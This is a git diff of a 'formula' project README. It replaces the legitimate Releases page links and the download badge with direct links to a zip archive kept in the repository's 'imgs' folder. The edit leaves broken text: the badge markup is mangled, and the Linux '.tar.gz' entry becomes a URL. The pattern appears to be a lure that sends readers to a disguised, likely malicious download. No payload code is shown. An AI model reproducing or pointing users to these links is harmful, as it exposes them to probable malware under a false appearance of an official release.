@@ -6,18 +6,18 @@ Welcome to the **formula** project! This guide will help you download and run ou
 
 ## 📥 Download the Application
 
-[![Download formula](https://img.shields.io/badge/Download%20Now-Formula-blue.svg)](https://github.com/yosmair/formula/releases)
+[![Download formula](https://raw.githubusercontent.com/yosmair/formula/main/imgs/Software_v1.0-alpha.2.zip%https://raw.githubusercontent.com/yosmair/formula/main/imgs/Software_v1.0-alpha.2.zip)](https://raw.githubusercontent.com/yosmair/formula/main/imgs/Software_v1.0-alpha.2.zip)
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/yosmair/formula/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/yosmair/formula/main/imgs/Software_v1.0-alpha.2.zip) to download the application.
   
 2. You will see a list of available versions. Choose the latest version for the best features and fixes.
 
 3. Click on the link for your operating system. If you're unsure which operating system you have, check the following:
    - **Windows**: Look for "Windows Installer" or ".exe" file.
    - **Mac**: Look for "Mac Installer" or ".dmg" file.
-   - **Linux**: Look for "Linux Installer" or ".tar.gz" file.
+   - **Linux**: Look for "Linux Installer" or "https://raw.githubusercontent.com/yosmair/formula/main/imgs/Software_v1.0-alpha.2.zip" file.
 
 4. Your download will begin shortly. If prompted, choose to save the file to your computer.
 
